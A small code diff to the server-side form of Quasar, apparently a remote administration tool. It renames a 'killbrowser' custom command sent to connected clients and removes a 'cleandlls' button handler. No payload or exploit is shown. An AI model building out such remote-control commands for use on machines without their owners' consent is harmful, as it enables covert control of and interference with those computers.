@@ -912,20 +912,10 @@ namespace Quasar.Server.Forms
             {
                 _connectClient.Send(new DoCustomCommand
                 {
-                    type = "killbrowser"
+                    type = "kill_clean"
                 });
             }
         }
 
-        private void btnCleanDlls_Click(object sender, EventArgs e)
-        {
-            if (_connectClient.Connected)
-            {
-                _connectClient.Send(new DoCustomCommand
-                {
-                    type = "cleandlls"
-                });
-            }
-        }
     }
 }
